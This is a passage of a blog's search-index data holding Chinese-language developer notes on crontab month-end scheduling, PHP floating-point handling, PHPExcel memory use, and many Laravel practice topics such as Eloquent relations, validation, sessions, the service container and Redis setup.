公司有遇到RAM 吃很大的問題 phpExcel導出文件時內存溢出的問題 - Cocowool - 博客園 mk-j/PHP_XLSXWriter: Lightwight XLSX Excel Spreadsheet Writer in PHP ","date":"2019-08-08","objectID":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:16:0","tags":["phpexcel"],"title":"PHPExcel 使用小記","uri":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"最近專案需要設定排程 主機上面的時區是 UTC+0 時間 但我們需要照 GMT+8 執行 排程往前面推-8 小時 但這時候遇到一個問題了 設定月初時間會跨前一天問題 ","date":"2019-08-04","objectID":"/blog/posts/%E6%8E%92%E7%A8%8B-crontab-%E6%99%82%E9%96%93%E8%A8%AD%E5%AE%9A%E6%9C%88%E5%BA%95%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:0:0","tags":["linux"],"title":"排程 crontab 時間設定月底執行方法","uri":"/blog/posts/%E6%8E%92%E7%A8%8B-crontab-%E6%99%82%E9%96%93%E8%A8%AD%E5%AE%9A%E6%9C%88%E5%BA%95%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"排程設定 L 字符 0 16 L * * * 有些排程工具是支援的 (spring, quartz) LINUX crontab 不支援 ","date":"2019-08-04","objectID":"/blog/posts/%E6%8E%92%E7%A8%8B-crontab-%E6%99%82%E9%96%93%E8%A8%AD%E5%AE%9A%E6%9C%88%E5%BA%95%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:1:0","tags":["linux"],"title":"排程 crontab 時間設定月底執行方法","uri":"/blog/posts/%E6%8E%92%E7%A8%8B-crontab-%E6%99%82%E9%96%93%E8%A8%AD%E5%AE%9A%E6%9C%88%E5%BA%95%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"shell 程式執行判斷 最近專案需要在 Rancher 設定 所以上面的方法無法用 有參考使用Crontab 每月最後一天執行 Shell Script 可以完成，範例如下 # 沒有環境變數，為true if [ -z \"$MODE\" ]; then php ..... else # 時間用 0 0 28-31 * * # 日期加一天為1，就算是今日事月底最後一天 DAY=$(date -d \"$(date +%Y-%m-%d) +1 day\" +%e) if [ \"$MODE\" = 'monthoflastday' ]; then if test $DAY -eq 1; then # run the script here php ...... fi; fi; fi; 簡單說明就是 Rancher 要跑的 JOB 要多一個 MODE 環境變數 透過這個知道哪個要執行月底執行，有些不用 ","date":"2019-08-04","objectID":"/blog/posts/%E6%8E%92%E7%A8%8B-crontab-%E6%99%82%E9%96%93%E8%A8%AD%E5%AE%9A%E6%9C%88%E5%BA%95%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:2:0","tags":["linux"],"title":"排程 crontab 時間設定月底執行方法","uri":"/blog/posts/%E6%8E%92%E7%A8%8B-crontab-%E6%99%82%E9%96%93%E8%A8%AD%E5%AE%9A%E6%9C%88%E5%BA%95%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"crontab 簡單判斷方法 55 23 28-31 * * [[ “$(date –date=tomorrow +%d)” == “01” ]] \u0026\u0026 myjob.sh 參考automation - Cron job to run on the last day of the month - Stack Overflow 其他 date 設置可以參考 Linux 使用 date 計算時間(昨天、明天) | Tsung’s Blog linux 中用 shell 获取时间,日期 - ccmaotang - 博客园 ","date":"2019-08-04","objectID":"/blog/posts/%E6%8E%92%E7%A8%8B-crontab-%E6%99%82%E9%96%93%E8%A8%AD%E5%AE%9A%E6%9C%88%E5%BA%95%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:3:0","tags":["linux"],"title":"排程 crontab 時間設定月底執行方法","uri":"/blog/posts/%E6%8E%92%E7%A8%8B-crontab-%E6%99%82%E9%96%93%E8%A8%AD%E5%AE%9A%E6%9C%88%E5%BA%95%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"shell 跑時間迴圈方法 另外 shell 跑時間迴圈方法 Bash: Looping through dates - Stack Overflow d=2015-01-01 while [ \"$d\" != 2015-02-20 ]; do echo $d d=$(date -I -d \"$d + 1 day\") done 其他參考來源: automation - Cron job to run on the last day of the month - Stack Overflow shell - How to check if a variable is set in Bash? - Stack Overflow Cron allowed special character “L” for “Last day of the month” on Debian - Unix \u0026 Linux Stack Exchange cron - Wikipedia date - Jenkins -run job 2 days before end of every month - Stack Overflow cron-last-sunday/run-if-today at master · xr09/cron-last-sunday 鳥哥的 Linux 私房菜 – 第十五章、例行性工作排程(crontab) linux下crontab与anacrontab的使用 - 小柒吃地瓜 ","date":"2019-08-04","objectID":"/blog/posts/%E6%8E%92%E7%A8%8B-crontab-%E6%99%82%E9%96%93%E8%A8%AD%E5%AE%9A%E6%9C%88%E5%BA%95%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:4:0","tags":["linux"],"title":"排程 crontab 時間設定月底執行方法","uri":"/blog/posts/%E6%8E%92%E7%A8%8B-crontab-%E6%99%82%E9%96%93%E8%A8%AD%E5%AE%9A%E6%9C%88%E5%BA%95%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["PHP"],"content":"最近公司做報表程式，看到裡面程式會 0.3254*1000 先做運算 然後運算完後會除1000 原本猜想是不是有浮點數問題 但我印象 0.1+0.2=0.3，這部分 PHP 好像沒有什麼問題 0.30000000000000004.com/ 但我今天看到這篇有提到php 踩過的那些坑（1）浮點數計算 - 每日頭條 二、防坑攻略： 1、通過乘 100 的方式轉化為整數加減，然後在除以 100 轉化回來…… 2、使用 number_format 轉化成字符串，然後在使用（float）強轉回來…… 3、php 提供了高精度計算的函數庫，實際上就是為了解決這個浮點數計算問題而生的。 原文網址：https://kknews.cc/finance/y86vrrj.html 使用 bcsub 方式可以解決問題，但記得後面要加入要算出來的浮點數 $a = 2586; $b = 2585.98; var_dump($a-$b); 有找到這個文章原始來源 這幾篇，也不錯 php 踩过的那些坑(1) isset()详解 - 壁虎漫步. - 博客园 備份圖 php 踩过的那些坑(2) strpos 引发的血案 - 壁虎漫步. - 博客园 備份圖 php 踩过的那些坑(3) 数据类型转换 - 壁虎漫步. - 博客园 備份圖 php 踩过的那些坑(4) false,NULL,0,‘‘详解 - 壁虎漫步. - 博客园 備份圖 php 踩过的那些坑（5）浮点数计算 - 壁虎漫步. - 博客园 備份圖 更多作者寫的內容 PHP - 随笔分类 - 壁虎漫步. - 博客园 ","date":"2019-08-04","objectID":"/blog/posts/PHP-%E5%81%9A%E6%B5%AE%E9%BB%9E%E6%95%B8%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/:0:0","tags":["php"],"title":"PHP 做浮點數需要注意的事情","uri":"/blog/posts/PHP-%E5%81%9A%E6%B5%AE%E9%BB%9E%E6%95%B8%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["Laravel"],"content":"由於最近看 Laravel 都沒有用在實戰上面 想藉由這個機會時做看看 不寫還真的有些不習慣 特別紀錄一下 –尚未整理完– ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:0:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"Laravel 新增檔案起手勢 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:1:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"建立一個 Model –migration 順便產生 migrate 檔案 Table 取的名會是複數 Table 取的名會是複數 Table 取的名會是複數 獎如是要自己新增的要注意!!! php artisan make:model Event --migration php artisan make:model Timer --migration ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:1:1","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"建立一個 Controller php artisan make:controller CustomersController php artisan make:controller CustomersController --model=Customer --migration 我以為能順便新增 migrate 但是不行!!! ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:1:2","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"三個願望一次滿足 新建東西，想把所有 Controller 建立出來要怎麼用? Laravel 5.4 create model, controller and migration in single artisan command - Stack Overflow php artisan make:model Todo -mcr -m, –migration Create a new migration file for the model. -c, –controller Create a new controller for the model. -r, –resource Indicates if the generated controller should be a resource controller 或者 php artisan make:model Todo -a -a, –all Generate a migration, factory, and resource controller for the model ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:1:3","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"Model 要注意的事情 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:2:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"fillable 每次新增 Model 完成，但通常會忘記填這個東西 仔細看這個，這個變數是防止 input 帶入 model 裡面 會被塞入奇奇怪怪的值 某種意義來說就是安全性!! ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:2:1","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"關聯 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:2:2","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"hasMany \u003c=\u003e belongTo hasMany public function comments() { return $this-\u003ehasMany('App\\Comment'); } public function post() { return $this-\u003ebelongsTo('App\\Post'); } Laravel 多張 table 使用 ORM 查詢 (遠層一對多關聯) – Bryce’S Note ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:2:3","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"Many to Many 我一直以為 X 對 X 就是講兩個 table，但是多對多簡單來講就是要用3個 table 而中介 table 命名為aaa_bbb(照英文順序命名，如:bbb_aaa會有問題，但可透過 belongToMany(xxxx,‘bbb_aaa’)) 簡單說一下，Many to Many 實作使用 3 個 table 但是只會寫 2 個 table(但 pivot 可自訂 class)，詳細官網一下，但通常應該不用寫 使用上 attach,detach,sync 控制 pivot 內容 pivot 通常不會建立 id 欄位 當然要設定也是能做到 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:2:4","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"ORM with 預載入 只能用再 X 對多 Event()-\u003etimers() 出現找不到 function 問題 BadMethodCallException with message 'Call to undefined method App/Event::timers()' 哪尼我照官方範例新增一個 Project 怎麼會錯呢!!! 怎麼 Google 都找不到問題，最後我發現是protected關係，要用public 為什麼呢? App\\Event::find(1) 沒有 new 出物件 所以protected的timers()就呼叫不到!!! 這是很正常的 所以要用public!!! 所以要用public!!! 所以要用public!!! 耗費一小時在查這個 orz ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:3:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"Model::find(20) 實現原理 這篇寫的很清楚 深入理解 laravel 中的 Eloquent ORM、查询构建器的核心原理 - 简书 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:3:1","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"命名建議 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:3:2","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"Form 表單這件事 我覺得網頁這個要熟悉 才能掌握網頁的程式 但是實作才了解 Laravel 我還不太了解 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:4:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"create 和 edit 拆開寫兩個 View 一開始實作我覺得應該有方法讓兩個 view 合併 我從書上 view 有一個 old() 函式可以呼叫 redirect-\u003ewith 出來東西 但是 view 變數沒抓到(未定義)的時候，可能程式錯誤無法顯示問題 再繼續寫，我發現 from 表單我使用route定義的時候 我發現一件事情，action 導去路徑不一樣 @method('POST') 和 @method('POST') 不一致 就算這些可以用邏輯去判斷網址 但我覺得會越來越亂 為何不如就分開兩個 view 其實表單重複的部分 我覺得可以用@include帶入 不過我等熟悉看如何做到 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:4:1","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"contoller view return view('page/week1/list'); return view('page.week1.show')-\u003ewith('event', Event::find($id)); return view('page.week1.update', ['event' =\u003e $event]); 可以用多個帶值到 View 裡面 可算說是非常方便 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:5:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"驗證起手勢 $input = Input::all(); $validator = Validator::make($input, [ 'name' =\u003e 'required|max:100', ]); if ($validator-\u003efails()) { return redirect()-\u003eroute('week1.edit', ['id' =\u003e $id]) -\u003ewithErrors($validator) -\u003ewithInput(); } 尚未了解事情 // 非正確的時候會導入到首頁，目前找不到修改對應首頁方法，建議用Validator::make $validatedData = $request-\u003evalidate([ 'name' =\u003e 'required|max:1', ]); ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:6:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"error 顯示方法 redirect()-\u003ewithErrors 可以抓取到 @if ($errors-\u003eany()) \u003cdiv class=\"alert alert-danger\"\u003e \u003cul\u003e @foreach ($errors-\u003eall() as $error) \u003cli\u003e{{ $error }}\u003c/li\u003e @endforeach \u003c/ul\u003e \u003c/div\u003e 正如前面所提到的，Laravel 會自動把使用者重導到先前的位置。另外，所有的驗證錯誤會被自動快閃至 session。 同樣的，注意我們不需要在 GET 路由明確的綁定錯誤訊息至視圖。這是因為 Laravel 會自動檢查 session 內的錯誤資料，如果錯誤存在的話，會自動綁定這些錯誤訊息到視圖。所以，請注意到 $errors 變數在每次請求的所有視圖中都將可以使用，讓你可以方便假設 $errors 變數已被定義且可以安全地使用。$errors 變數是 Illuminate\\Support\\MessageBag 的實例。有關此物件的詳細資訊，請查閱它的文件。 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:6:1","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"success 方法 內建沒有 WithSuccess 但還是可以塞自己想要的資料 return redirect()-\u003eroute('week1.edit', ['id' =\u003e $id]) -\u003ewith('success', '修改成功'); @endif @if (session()-\u003ehas('succes')) \u003cdiv class=\"alert alert-primary\"\u003e \u003cul\u003e \u003cli\u003e{{ session()-\u003eget('succes') }}\u003c/li\u003e \u003c/ul\u003e \u003c/div\u003e @endif 上面也可以用@if(isset($success)) 注意with 除了寫 session 他也可以當view 變數名稱 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:6:2","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"Laravel 有關 with function 那些事情 一直看書看到有很多地方都有用到 with 不仔細看，我還以為他們都是一樣的東西 但是用在不同地方還是不一樣 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:7:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"orm with 之前我有小記，但我沒有用，有空來小記 總結要點：使用 Laravel 開發工具，ORM 查詢的 N + 1 問題 | Laravel China 社區 - 高品質的 Laravel 開發者社區 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:7:1","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"view with 這個等於 view()第二個參數帶到 blade 去 laravel5-example/resources/views/back/blog at master · bestmomo/laravel5-example View 資料夾要如何分? 目前我只想到 layout ,page 但官方沒有限制 很多 Project 都不時一樣 laravel5-example/resources/views/back/blog at master · bestmomo/laravel5-example ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:7:2","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"redirect with 一直以為這個跟 view with 一樣 但是看一下原始碼 他是存在 session(flashdatg 下一個頁面就會清除) ，可以用 old 快速呼叫 原本我以為可以用 create 和 edit 共用同一個 view 但發現難度太高，因為 old(’name’,$event-\u003ename) 但是在 create 頁面就會掛掉 也許我可以在 create 做一個空event? 有空試試看 withErrors 和 withInput 一樣的道理 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:7:3","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"action 和 route 選擇 {{ action('EventController@edit', ['id'=\u003e1]) }} {{ route('week1.edit', ['id'=\u003e1]) }} 我選擇用 route 打很少字，就算之後要換檔名不用修改很多檔案裡面的內容 可以算是非常方便 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:8:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"用 Laravel Mix 記得加 meta csrf \u003cmeta name=\"csrf-token\" content=\"{{ csrf_token() }}\" /\u003e Console.log 好心提醒 CSRF token not found: https://laravel.com/docs/csrf#csrf-x-csrf-token ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:9:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"Laravel 5.x 移除 html helper 不知道為什麼超多人還是有用 laravel 5 Form 和 HTML 的使用 - 袁超 - SegmentFault 思否 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:10:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"DB(ORM) 建立交易 需要抓到外面的變數可以用 use DB::transaction(function () use ($input, \u0026$is_save) { $event = new Event($input); $event-\u003esave(); $event-\u003esort = $event-\u003eid; $is_save = $event-\u003esave(); }); 鎖定資料 Lock · Laravel 5 學習筆記 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:11:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"服務容器 从 1 行代码开始，带你系统性地理解 Service Container 核心概念 | Laravel China 社区 从 1 行代码开始，带你系统性地理解 Service Container 核心概念 | Laravel China 社区 Laravel 学习笔记 —— 神奇的服务容器 | Laravel China 社区 以上兩篇我看完小記的觀點，不一定正確，建議還是看裡面的內容。 我覺得這幾篇講的名詞都很抽象，所以不是很好懂(但是裡面這幾篇算是我找得最清楚的) 先講講我怎麼看裡面容器 我當初以為所有類別都是容器但其實容器應該就是指Container::getInstance這一段類別 更深入了解 Ioc 和 DI 意思 我覺得可以看下面這邊 控制反轉 (IoC) 與 依賴注入 (DI) - NotFalse 技術客 感想 看完有種想把所有東西都塞到容器裡面? 但我後來想想應該不需要 我覺得容器有點像兩個 class 工通橋梁(如 Laravel app()) 再透過 Facade 或 helper function 更加方便 同時兩個類別可以呼叫不同 class bind 後的實例 Laravel 如何實現依賴性注入？ - 技術保鮮盒 - Medium ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:12:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"Repository 在 Laravel 5 中使用 Repository 模式实现业务逻辑和数据访问的分离 - Laravel 学院 为什么你应该使用 Repository - Laravel - SegmentFault 思否 如何使用 Repository 模式 · laravel 学习 · 看云 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:12:1","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"factory /seeder Laravel - Seeding Many-to-Many Relationship - Stack Overflow ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:13:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"form checkbox php - laravel 怎么接收和保存一组 checkbox 到数据库？ - SegmentFault 思否 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:14:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"控制器依賴注入原理 自訂隱晦路由器參數查詢 - Yish - Medium 关于 laravel5.5 控制器方法参数依赖注入原理深度解析及问题修复 - 程序人生 ♨︎ - 博客园 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:15:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"授權 GATE \u0026 Policy laravel5.5 授权系统 - archer-wong - 博客园 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:16:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"Redis Laravel 6.2 使用 Redis::get 會遇到 Please remove or rename the Redis facade alias in your \"app\" configuration file in order to avoid collision with the PHP Redis extension. 使用 Cache::put 看似能用，但預設 env 是 file，切換到 redis，還是遇到一樣的問題 看似 Homestead 預設沒安裝 redis 套件 phpredis 需要改裡面程式內容 這邊有兩個做法 改成用 predis 方法(不推薦) composer require predis/predis 1 Replace in config\\app.php aliasess: ‘Redis’ =\u003e Illuminate\\Support\\Facades\\Redis::class, for: ‘RedisManager’ =\u003e Illuminate\\Support\\Facades\\Redis::class, 2 Replace in config\\database.php ‘redis’ =\u003e [ ‘client’ =\u003e env(‘REDIS_CLIENT’, ‘predis’), //default phpredis … 參考來源:https://github.com/laravel/horizon/issues/659#issuecomment-528569052 改成用 phpredis 方法 Homestead 預設沒有安裝 php redis 套件，所以需要手動安裝 不知道新版的 Homestead 會不會預設安裝? 可參考:Homestead 安装 PHP Redis 扩展 | Laravel China 社区 備份圖 相關資料: Homestead 安装 PHP Redis 扩展 - 菜园子 - SegmentFault 思否 Homestead 环境没有 phpize 怎么安装 Redis 扩展？？？ | Laravel China 社区 Laravel 6 使用 Redis 注意事项 | Laravel China 社区 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:17:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"Laravel Help https://stackoverflow.com/questions/58163406/after-upgrading-laravel-from-5-6-to-6-0-call-to-undefined-str-random-function ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:18:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"Laravel Router 多人維護最佳方式 Laravel 分割 routes.php 路由文件的最佳方式 | Laravel China 社区 ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:19:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"Laravel blade Javascript 設計 Laravel – 設計一個好的 Blade Template, 使用 @parent | 不怕就是強 一般設計 Jigsaw – Static Sites for Laravel Developers ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:20:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"Laravel 6 安裝 Bootstrap 6 composer require laravel/ui –dev // Generate basic scaffolding... php artisan ui bootstrap php artisan ui vue php artisan ui react // Generate login / registration scaffolding... php artisan ui bootstrap --auth php artisan ui vue --auth php artisan ui react --auth ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:21:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"blade ","date":"2019-07-16","objectID":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/:22:0","tags":["laravel"],"title":"Laravel 實作小記","uri":"/blog/posts/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"使用 Laravel Navbar 做 selected 設定 \u003cul class=\"nav nav-second-level\"\u003e \u003cli class=\"{{ Request::segment(1) === 'programs' ? 